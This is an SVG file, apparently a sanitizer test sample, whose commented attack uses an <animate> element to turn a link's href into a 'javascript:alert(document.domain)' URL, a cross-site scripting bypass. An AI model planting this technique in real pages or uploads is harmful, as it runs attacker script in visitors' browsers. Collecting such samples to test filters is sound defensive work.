<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <!-- Attack: <animate attributeName="href" values="javascript:..."> animates a link into a script URL. -->
  <a href="#keep"><animate attributeName="href" values="javascript:alert(document.domain)"/><rect id="keep" width="10" height="10" fill="#004357"/></a>
</svg>
